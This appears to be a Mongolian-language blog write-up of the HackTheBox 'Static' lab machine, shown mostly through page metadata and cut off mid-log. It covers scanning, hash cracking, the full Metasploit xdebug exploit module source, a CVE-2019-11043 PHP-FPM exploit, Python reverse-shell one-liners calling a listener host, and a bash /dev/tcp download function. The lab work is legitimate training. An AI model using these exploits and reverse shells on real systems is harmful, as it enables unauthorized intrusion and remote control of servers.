<!doctype html><html lang=mn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Static | CaDiL's Blog</title>
<meta name=keywords content="Writeup"><meta name=description content="HTB - Static - Writeup /Mostly Notes/"><meta name=author content="CaDiL"><link rel=canonical href=https://cadil.github.io/posts/2024-02-22-htb-static-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://cadil.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://cadil.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://cadil.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://cadil.github.io/apple-touch-icon.png><link rel=mask-icon href=https://cadil.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=mn href=https://cadil.github.io/posts/2024-02-22-htb-static-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HTB - Static"><meta property="og:description" content="HTB - Static - Writeup /Mostly Notes/"><meta property="og:type" content="article"><meta property="og:url" content="https://cadil.github.io/posts/2024-02-22-htb-static-writeup/"><meta property="og:image" content="https://cadil.github.io/static"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-02-22T00:00:00+00:00"><meta property="article:modified_time" content="2024-02-22T00:00:00+00:00"><meta property="og:site_name" content="CaDiL's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://cadil.github.io/static"><meta name=twitter:title content="HTB - Static"><meta name=twitter:description content="HTB - Static - Writeup /Mostly Notes/"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://cadil.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Static","item":"https://cadil.github.io/posts/2024-02-22-htb-static-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Static","name":"HTB - Static","description":"HTB - Static - Writeup /Mostly Notes/","keywords":["Writeup"],"articleBody":"PS: Үүсгэсэн огноо: 2021 оны 11-р сарын 6~9 өдрүүдэд бичсэн тэмдэглэл юм.\n1. IP Address # Machine Address 10.10.10.246 # Local Address 10.10.14.22 2. Nmap sudo nmap -sC -sV -oA nmap/static 10.10.10.246 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-06 00:31 EDT Nmap scan report for 10.10.10.246 Host is up (0.21s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA) | 256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA) |_ 256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519) 2222/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA) | 256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA) |_ 256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519) 8080/tcp open http Apache httpd 2.4.38 ((Debian)) | http-robots.txt: 2 disallowed entries |_/vpn/ /.ftp_uploads/ |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Site doesn't have a title (text/html; charset=UTF-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 3. Gobuster gobuster dir -u http://10.10.10.246:8080/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x .php,txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.246:8080/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2021/11/06 00:36:53 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 0] /robots.txt (Status: 200) [Size: 55] Progress: 117513 / 661683 (17.76%) ^C [!] Keyboard interrupt detected, terminating. =============================================================== 2021/11/06 00:44:47 Finished =============================================================== Robot.txt\nUser-agent: * Disallow: /vpn/ Disallow: /.ftp_uploads/ 4. fixgz Git -с clone:\ngit clone https://github.com/yonjar/fixgz.git cpp compile:\ng++ fixgz.cpp -o fixgz broken gz засах:\n./fixgz db.sql.gz db.gz Unzip:\ngunzip db.gz cat db CREATE DATABASE static; USE static; CREATE TABLE users ( id smallint unsigned not null auto_increment, username varchar(20) not null, password varchar(40) not null, totp varchar(16) not null, primary key (id) ); INSERT INTO users ( id, username, password, totp ) VALUES ( null, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997', 'orxxi4c7orxwwzlo' ); 5. Hash hash:\nd033e22ae348aeb5660fc2140aec35850c4da997 Файл болгов:\nvi hash d033e22ae348aeb5660fc2140aec35850c4da997 Hash тайлах:\njohn hash Output:\nCreated directory: /home/ca4mi/.john Warning: detected hash type \"Raw-SHA1\", but the string is also recognized as \"Raw-SHA1-AxCrypt\" Use the \"--format=Raw-SHA1-AxCrypt\" option to force loading these as that type instead Warning: detected hash type \"Raw-SHA1\", but the string is also recognized as \"Raw-SHA1-Linkedin\" Use the \"--format=Raw-SHA1-Linkedin\" option to force loading these as that type instead Warning: detected hash type \"Raw-SHA1\", but the string is also recognized as \"ripemd-160\" Use the \"--format=ripemd-160\" option to force loading these as that type instead Warning: detected hash type \"Raw-SHA1\", but the string is also recognized as \"has-160\" Use the \"--format=has-160\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x]) Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist admin (?) 1g 0:00:00:00 DONE 2/3 (2021-11-06 01:01) 20.00g/s 56480p/s 56480c/s 56480C/s abbott..admin1 Use the \"--show --format=Raw-SHA1\" options to display all of the cracked passwords reliably Session completed admin\n6. 2FA Machine, HTB-н VPN нарын цагийн бүс адилхан байх хэрэгтэй юм билээ. HTB дээрх сервер zone сольж ороод дахин үзсэн.\n/vpn/login.php: 2FA нэхэж байгаа https://addons.mozilla.org/en-US/firefox/addon/auth-helper/ - татаж аваад entry оруулаад орсон.\nhttp://10.10.10.246:8080/vpn/panel.php\n7. OVPN Support хэсгээс web - vpn татаж аваад ажилууллна.\nopenvpn web.ovpn Оutput:\n2021-11-06 04:25:07 Outgoing Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication 2021-11-06 04:25:07 Incoming Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication 2021-11-06 04:25:07 RESOLVE: Cannot resolve host address: vpn.static.htb:1194 (Name or service not known) 2021-11-06 04:25:07 RESOLVE: Cannot resolve host address: vpn.static.htb:1194 (Name or service not known) 2021-11-06 04:25:07 Could not determine IPv4/IPv6 protocol 2021-11-06 04:25:07 SIGUSR1[soft,init_instance] received, process restarting 2021-11-06 04:25:07 Restart pause, 40 second(s) 2021-11-06 04:25:47 Outgoing Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication 2021-11-06 04:25:47 Incoming Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication 2021-11-06 04:25:47 RESOLVE: Cannot resolve host address: vpn.static.htb:1194 (Name or service not known) 2021-11-06 04:25:47 RESOLVE: Cannot resolve host address: vpn.static.htb:1194 (Name or service not known) vpn.static.htb - танихгүй байгаа. etc/hosts дотор нэмэх. 172.20.0.10 - browser-с хандалт авахгүй байна.\nifconfig:\ntun9: flags=4305 mtu 1500 inet 172.30.0.9 netmask 255.255.0.0 destination 172.30.0.9 inet6 fe80::9198:489e:ac83:105 prefixlen 64 scopeid 0x20 unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 txqueuelen 500 (UNSPEC) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 4 bytes 192 (192.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 tun9 -г route руу access хийнэ. Ингэснээр 172.30.0.9 -\u003e 172.20.0.0/24:\nip route add 172.20.0.0/24 dev tun9 /Host/ Parrot OS - ip route add хийхэд sudo шаардсан. sudo-г нэмсэн.\n7. Metasploit - xdebug info.php ороод xdebug байгаа. Version: 2.6.0\nmetasploit: https://www.rapid7.com/db/modules/exploit/unix/http/xdebug_unauth_exec/ metasploit run:\nsudo msfdb run Тохируулга хийх:\nuse exploit/unix/http/xdebug_unauth_exec set PATH /vpn/login.php set RHOSTS 172.20.0.10 set LHOST tun9 set LPORT 9001 Тохиргоо:\nModule options (exploit/unix/http/xdebug_unauth_exec): Name Current Setting Required Description ---- --------------- -------- ----------- PATH /vpn/login.php yes Path to target webapp Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 172.20.0.10 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 80 yes The target port (TCP) SRVHOST 0.0.0.0 yes Callback host for accepting connections SRVPORT 9000 yes Port to listen for the debugger SSL false no Negotiate SSL/TLS for outgoing connections VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST tun9 yes The listen address (an interface may be specified) LPORT 9001 yes The listen port Exploit target: Id Name -- ---- 0 Automatic Ажилууллах\nrun 1500 -\u003e 1200 болгож үзсэн, exploit болохгүй байсан болохоор connection-д асуудал байна уу. Гэхдээ болоогүй.\nifconfig tun0 mtu 1200 metaexploit -с нь биш шууд ruby ажилууллах гэж үзсэн. Болоогүй.\n## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule \u003c Msf::Exploit::Remote Rank = ExcellentRanking include Msf::Exploit::Remote::Tcp include Msf::Exploit::Remote::HttpClient include Rex::Proto::Http def initialize(info = {}) super(update_info(info, 'Name' =\u003e 'xdebug Unauthenticated OS Command Execution', 'Description' =\u003e %q{ Module exploits a vulnerability in the eval command present in Xdebug versions 2.5.5 and below. This allows the attacker to execute arbitrary php code as the context of the web user. }, 'DisclosureDate' =\u003e '2017-09-17', 'Author' =\u003e [ 'Ricter Zheng', #Discovery https://twitter.com/RicterZ 'Shaksham Jaiswal', # MinatoTW 'Mumbai' # Austin Hudson ], 'References' =\u003e [ ['URL', 'https://redshark1802.com/blog/2015/11/13/xpwn-exploiting-xdebug-enabled-servers/'], ['URL', 'https://paper.seebug.org/397/'] ], 'License' =\u003e MSF_LICENSE, 'Platform' =\u003e 'php', 'Arch' =\u003e [ARCH_PHP], 'DefaultTarget' =\u003e 0, 'Stance' =\u003e Msf::Exploit::Stance::Aggressive, 'DefaultOptions' =\u003e { 'PAYLOAD' =\u003e 'php/meterpreter/reverse_tcp' }, 'Payload' =\u003e { 'DisableNops' =\u003e true, }, 'Targets' =\u003e [[ 'Automatic', {} ]], )) register_options([ OptString.new('PATH', [ true, \"Path to target webapp\", \"/index.php\"]), OptAddress.new('SRVHOST', [ true, \"Callback host for accepting connections\", \"0.0.0.0\"]), OptInt.new('SRVPORT', [true, \"Port to listen for the debugger\", 9000]), Opt::RPORT(80), ]) end def check begin res = send_request_cgi({ 'uri' =\u003e datastore[\"PATH\"], 'method' =\u003e 'GET', 'vars_get' =\u003e { 'XDEBUG_SESSION_START' =\u003e rand_text_alphanumeric(10) } }) vprint_status \"Request sent\\n#{res}\" if res \u0026\u0026 res.headers.to_s =~ /XDEBUG/i vprint_good(\"Looks like remote server has xdebug enabled\\n\") return CheckCode::Detected else return CheckCode::Safe end rescue Rex::ConnectionError return CheckCode::Unknown end end def exploit payl = Rex::Text.encode_base64(\"#{payload.encoded}\") cmd1 = \"eval -i 1 -- \" + Rex::Text.encode_base64(\"eval(base64_decode(\\\"#{payl}\\\"));\") + \"\\x00\" webserver = Thread.new do begin server = Rex::Socket::TcpServer.create( 'LocalPort' =\u003e datastore['SRVPORT'], 'LocalHost' =\u003e datastore['SRVHOST'], 'Context' =\u003e { 'Msf' =\u003e framework, 'MsfExploit' =\u003e self }) client = server.accept print_status(\"Waiting for client response.\") data = client.recv(1024) print_status(\"Receiving response\") vprint_line(data) print_status(\"Shell might take upto a minute to respond.Please be patient.\") print_status(\"Sending payload of size #{cmd1.length} bytes\") client.write(cmd1) client.close server.close webserver.exit ensure webserver.exit end end send_request_cgi({ 'uri' =\u003e datastore['PATH'], 'method' =\u003e 'GET', 'headers' =\u003e { 'X-Forwarded-For' =\u003e \"#{lhost}\", 'Cookie' =\u003e 'XDEBUG_SESSION='+rand_text_alphanumeric(10) } }) end end Exploit болохгүй байсан. Тэгээд цаг нилээн аваад байхаар нь бэлэн rsa -г writeup, forum үзэж байгаад шууд хуулсан.\n-----BEGIN RSA PRIVATE KEY----- MII*********** -----END RSA PRIVATE KEY----- www-data - нэрээр нэвтэрч ороод user.txt авсан. -p 2222 бичихгүй бол болохгүй nmap дээр ssh порт 2222 гэж заасан байсан.\nssh -i id_rsa_www-data www-data@10.10.10.246 -p 2222 8. Privilege escalation ssh дотроос ifconfig:\neth0: flags=4163 mtu 1500 inet 172.20.0.10 netmask 255.255.255.0 broadcast 172.20.0.255 ether 02:42:ac:14:00:0a txqueuelen 0 (Ethernet) RX packets 376 bytes 47797 (47.7 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 275 bytes 72946 (72.9 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 eth1: flags=4163 mtu 1500 inet 192.168.254.2 netmask 255.255.255.0 broadcast 192.168.254.255 ether 02:42:c0:a8:fe:02 txqueuelen 0 (Ethernet) RX packets 48 bytes 29063 (29.0 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 25 bytes 1796 (1.7 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73 mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 28 bytes 1485 (1.4 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 28 bytes 1485 (1.4 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 192.168.254.2 -\u003e 192.168.254.3 - ip хаяг\nPort forwarding (sudo):\nssh -L 80:192.168.254.3:80 www-data@10.10.10.246 -p 2222 -i id_rsa_www-data Out:\nThe authenticity of host '[10.10.10.246]:2222 ([10.10.10.246]:2222)' can't be established. ECDSA key fingerprint is SHA256:SO5uMKk4fPWk/kDc0dLD5Uf7dlyIes4r6s26waZlxkQ. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '[10.10.10.246]:2222' (ECDSA) to the list of known hosts. Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.19.0-17-amd64 x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage This system has been minimized by removing packages and content that are not required on a system that users do not log into. To restore this content, you can run the 'unminimize' command. Last login: Mon Nov 8 10:57:19 2021 from 10.10.14.84 localhost эсхүл 127.0.0.1 хандахаар:\nbatch mode: /usr/bin/ersatool create|print|revoke CN Browser -\u003e Network цэсээр ороод харвал:\nX-Powered-By PHP-FPM/7.1 https://medium.com/@knownsec404team/php-fpm-remote-code-execution-vulnerability-cve-2019-11043-analysis-35fd605dd2dc https://github.com/theMiddleBlue/CVE-2019-11043 Git git clone https://github.com/theMiddleBlue/CVE-2019-11043.git dedsec.py: exploit.py ажилуулсны дараа бэлэн py ажилууллах rev shell. Бэлэн код аваад хуулсан.\nimport requests payload = '/usr/bin/python3.6 -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.254.2\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\\'' r = requests.get(\"http://192.168.254.3/index.php?a=\"+payload) print(r.text) Netcat: https://github.com/H74N/netcat-binaries/blob/master/nc\nДээр байгаа 3 файл хэрэгтэй. Нэгтгэж аваад нэг dir дотор оруулсан.\ntotal 780 drwxr-xr-x 1 ca4mi ca4mi 72 Nov 8 06:11 . drwxr-xr-x 1 ca4mi ca4mi 26 Nov 8 06:07 .. -rw-r--r-- 1 ca4mi ca4mi 349 Nov 8 06:05 dedsec.py -rw-r--r-- 1 ca4mi ca4mi 4280 Nov 8 06:02 exploit.py -rw------- 1 ca4mi ca4mi 1675 Nov 8 06:11 id_rsa_www-data -rw-r--r-- 1 ca4mi ca4mi 779832 Nov 8 06:06 n scp: Тэгээд scp-р файлуудаа хуулсан.\nscp -P 2222 -i id_rsa_www-data nc www-data@10.10.10.246:/tmp/nc scp -P 2222 -i id_rsa_www-data exploit.py www-data@10.10.10.246:/tmp/exploit.py scp -P 2222 -i id_rsa_www-data dedsec.py www-data@10.10.10.246:/tmp/dedsec.py nc run: bin шинээр ажилууллж байгаа тул chmod +x хийнэ.\nwww-data@web:/tmp$ chmod +x nc www-data@web:/tmp$ ./nc -lvnp 9001 listening on [any] 9001 ... exploit.py ажилуулбал:\npython3 exploit.py --url [http://192.168.254.3/index.php](http://192.168.254.3/index.php) Хэвийн байлаа:\nwww-data@web:/tmp$ python3 exploit.py --url http://192.168.254.3/index.php [*] QSL candidate: 1754, 1759, 1764 [*] Target seems vulnerable (QSL:1754/HVL:220): PHPSESSID=a4632a83f8ca8a3690e01fc3cf1e1e19; path=/ [*] RCE successfully exploited! You should be able to run commands using: curl http://192.168.254.3/index.php?a=bin/ls+/ Бэлэн кодоо ажилууллах.\npython3 dedsec.py Энэ өөр таб дээр порт сонсож байгаад pki орж байгаа log:\nlistening on [any] 9001 ... connect to [192.168.254.2] from (UNKNOWN) [192.168.254.3] 41604 www-data@pki:~/html$ ls ls index.php uploads www-data@pki:~/html$ Ersatool - access шалгах:\nls -al /usr/bin/ersatool -rwxr-xr-x 1 root root 22496 Jun 21 17:05 /usr/bin/ersatoo ersatool - г ажилуулж болох эсэх:\nfind / -name ersatool.* 2\u003e/dev/null /usr/src/ersatool.c http сервер асаах:\npython3 -m http.server 1337 PSPY ажилууллах, wget, curl байхгүй болохоор өөр арга: Bash script -г www-data@pki-с бичнэ:\n1\nfunction __curl() { read proto server path \u003c\u003c\u003c$(echo ${1//// }) DOC=/${path// //} HOST=${server//:*} PORT=${server//*:} [[ x\"${HOST}\" == x\"${PORT}\" ]] \u0026\u0026 PORT=80exec **3**\u003c\u003e/dev/tcp/${HOST}/$PORT echo -en \"GET ${DOC} HTTP/1.0\\r\\nHost: ${HOST}\\r\\n\\r\\n\" \u003e**\u00263** (while read line; do [[ \"$line\" == $'\\r' ]] \u0026\u0026 break done \u0026\u0026 cat) \u003c**\u00263** exec **3**\u003e\u0026- } 2\n__curl http://192.168.254.2:1337/pspy \u003e pspy хуулах:\nscp -P 2222 -i id_rsa_www-data pspy64s www-data@10.10.10.246:/tmp/pspy pspy ажилуулах:\nwww-data@pki:/tmp/www$ chmod +x pspy www-data@pki:/tmp/www$ ./pspy | tee log pspy ажилуулаад ersatool (create, a,b print, exit..) юу хийж байгааг харсан. Хоёр REV SHELL хэрэгтэй болсон:\nwww-data@pki:/tmp/www$ chmod +x pspy www-data@pki:/tmp/www$ ./pspy pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855 ██▓███ ██████ ██▓███ ▓██ ██▓ ▓██░ ██▒▒██ ▒ ▓██░ ██▒▒██ ██▒ ▓██░ ██▓▒░ ▓██▄ ▓██░ ██▓▒ ▒██ ██░ ▒██▄█▓▒ ▒ ▒ ██▒▒██▄█▓▒ ▒ ░ ▐██▓░ ▒██▒ ░ ░▒██████▒▒▒██▒ ░ ░ ░ ██▒▓░ ▒▓▒░ ░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░ ░ ██▒▒▒ ░▒ ░ ░ ░▒ ░ ░░▒ ░ ▓██ ░▒░ ░░ ░ ░ ░ ░░ ▒ ▒ ░░ ░ ░ ░ ░ ░Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive) Draining file system events due to startup... done 2021/06/25 02:46:00 CMD: UID=0 PID=9 | nginx: master process nginx 2021/06/25 02:46:00 CMD: UID=0 PID=7 | /bin/bash /entry.sh 2021/06/25 02:46:00 CMD: UID=33 PID=542 | php-fpm: pool www 2021/06/25 02:46:00 CMD: UID=33 PID=541 | php-fpm: pool www 2021/06/25 02:46:00 CMD: UID=33 PID=540 | php-fpm: pool www 2021/06/25 02:46:00 CMD: UID=33 PID=539 | php-fpm: pool www 2021/06/25 02:46:00 CMD: UID=33 PID=538 | php-fpm: pool www 2021/06/25 02:46:00 CMD: UID=33 PID=1950 | ./pspy 2021/06/25 02:46:00 CMD: UID=33 PID=1935 | /bin/bash 2021/06/25 02:46:00 CMD: UID=33 PID=1934 | python3 -c import pty; pty.spawn(\"/bin/bash\") 2021/06/25 02:46:00 CMD: UID=33 PID=1931 | /bin/bash 2021/06/25 02:46:00 CMD: UID=33 PID=1930 | python3 -c import pty; pty.spawn(\"/bin/bash\") 2021/06/25 02:46:00 CMD: UID=33 PID=1927 | /bin/bash 2021/06/25 02:46:00 CMD: UID=33 PID=1926 | //usr/bin/python3.6 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.254.2\",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\") 2021/06/25 02:46:00 CMD: UID=33 PID=1925 | sh -c //usr/bin/python3.6 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.254.2\",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")' 2021/06/25 02:46:00 CMD: UID=33 PID=1921 | /bin/bash 2021/06/25 02:46:00 CMD: UID=33 PID=1920 | //usr/bin/python3.6 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.254.2\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\") 2021/06/25 02:46:00 CMD: UID=33 PID=1919 | sh -c //usr/bin/python3.6 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.254.2\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")' 2021/06/25 02:46:00 CMD: UID=0 PID=12 | php-fpm: master process (/usr/local/etc/php-fpm.conf) 2021/06/25 02:46:00 CMD: UID=33 PID=11 | nginx: worker process 2021/06/25 02:46:00 CMD: UID=33 PID=10 | nginx: worker process 2021/06/25 02:46:00 CMD: UID=0 PID=1 | /bin/sh -c /entry.sh 2021/06/25 02:46:03 CMD: UID=33 PID=1959 | /usr/bin/ersatool 2021/06/25 02:46:35 CMD: UID=0 PID=1961 | sh -c /opt/easyrsa/easyrsa build-client-full a nopass batch 2021/06/25 02:46:35 CMD: UID=0 PID=1960 | /usr/bin/ersatool 2021/06/25 02:46:35 CMD: UID=0 PID=1962 | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch 2021/06/25 02:46:35 CMD: UID=0 PID=1963 | sed -e s`ENV::EASYRSA`EASYRSA`g -e s`$dir`/opt/easyrsa/pki`g -e s`$EASYRSA_PKI`/opt/easyrsa/pki`g -e s`$EASYRSA_CERT_EXPIRE`36500`g -e s`$EASYRSA_CRL_DAYS`180`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_KEY_SIZE`2048`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_DN`cn_only`g -e s`$EASYRSA_REQ_COUNTRY`US`g -e s`$EASYRSA_REQ_PROVINCE`California`g -e s`$EASYRSA_REQ_CITY`San Francisco`g -e s`$EASYRSA_REQ_ORG`Copyleft Certificate Co`g -e s`$EASYRSA_REQ_OU`My Organizational Unit`g -e s`$EASYRSA_REQ_CN`ChangeMe`g -e s`$EASYRSA_REQ_EMAIL`me@example.net`g /opt/easyrsa/pki/openssl-easyrsa.cnf 2021/06/25 02:46:35 CMD: UID=0 PID=1964 | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch 2021/06/25 02:46:35 CMD: UID=0 PID=1965 | openssl version 2021/06/25 02:46:35 CMD: UID=0 PID=1966 | sed -e s`ENV::EASYRSA`EASYRSA`g -e s`$dir`/opt/easyrsa/pki`g -e s`$EASYRSA_PKI`/opt/easyrsa/pki`g -e s`$EASYRSA_CERT_EXPIRE`36500`g -e s`$EASYRSA_CRL_DAYS`180`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_KEY_SIZE`2048`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_DN`cn_only`g -e s`$EASYRSA_REQ_COUNTRY`US`g -e s`$EASYRSA_REQ_PROVINCE`California`g -e s`$EASYRSA_REQ_CITY`San Francisco`g -e s`$EASYRSA_REQ_ORG`Copyleft Certificate Co`g -e s`$EASYRSA_REQ_OU`My Organizational Unit`g -e s`$EASYRSA_REQ_CN`a`g -e s`$EASYRSA_REQ_EMAIL`me@example.net`g /opt/easyrsa/pki/openssl-easyrsa.cnf 2021/06/25 02:46:35 CMD: UID=0 PID=1967 | sed -e s`ENV::EASYRSA`EASYRSA`g -e s`$dir`/opt/easyrsa/pki`g -e s`$EASYRSA_PKI`/opt/easyrsa/pki`g -e s`$EASYRSA_CERT_EXPIRE`36500`g -e s`$EASYRSA_CRL_DAYS`180`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_KEY_SIZE`2048`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_DN`cn_only`g -e s`$EASYRSA_REQ_COUNTRY`US`g -e s`$EASYRSA_REQ_PROVINCE`California`g -e s`$EASYRSA_REQ_CITY`San Francisco`g -e s`$EASYRSA_REQ_ORG`Copyleft Certificate Co`g -e s`$EASYRSA_REQ_OU`My Organizational Unit`g -e s`$EASYRSA_REQ_CN`a`g -e s`$EASYRSA_REQ_EMAIL`me@example.net`g /opt/easyrsa/pki/openssl-easyrsa.cnf 2021/06/25 02:46:35 CMD: UID=0 PID=1968 | mktemp /opt/easyrsa/pki/private/a.key.XXXXXXXXXX 2021/06/25 02:46:35 CMD: UID=0 PID=1969 | mktemp /opt/easyrsa/pki/reqs/a.req.XXXXXXXXXX 2021/06/25 02:46:35 CMD: UID=0 PID=1970 | openssl req -utf8 -new -newkey rsa:2048 -config /opt/easyrsa/pki/safessl-easyrsa.cnf -keyout /opt/easyrsa/pki/private/a.key.HZbmrNjLDK -out /opt/easyrsa/pki/reqs/a.req.BOyXzgidnO -nodes -batch 2021/06/25 02:46:35 CMD: UID=0 PID=1971 | 2021/06/25 02:46:35 CMD: UID=0 PID=1972 | mv /opt/easyrsa/pki/reqs/a.req.BOyXzgidnO /opt/easyrsa/pki/reqs/a.req 2021/06/25 02:46:35 CMD: UID=0 PID=1973 | openssl rand -hex -out /opt/easyrsa/pki/serial 16 2021/06/25 02:46:35 CMD: UID=0 PID=1974 | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch 2021/06/25 02:46:35 CMD: UID=0 PID=1975 | openssl ca -config /opt/easyrsa/pki/openssl-easyrsa.cnf -status 2243a379dfbe067da1fa206727f760b3 2021/06/25 02:46:35 CMD: UID=0 PID=1976 | sed -e s`ENV::EASYRSA`EASYRSA`g -e s`$dir`/opt/easyrsa/pki`g -e s`$EASYRSA_PKI`/opt/easyrsa/pki`g -e s`$EASYRSA_CERT_EXPIRE`36500`g -e s`$EASYRSA_CRL_DAYS`180`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_KEY_SIZE`2048`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_DN`cn_only`g -e s`$EASYRSA_REQ_COUNTRY`US`g -e s`$EASYRSA_REQ_PROVINCE`California`g -e s`$EASYRSA_REQ_CITY`San Francisco`g -e s`$EASYRSA_REQ_ORG`Copyleft Certificate Co`g -e s`$EASYRSA_REQ_OU`My Organizational Unit`g -e 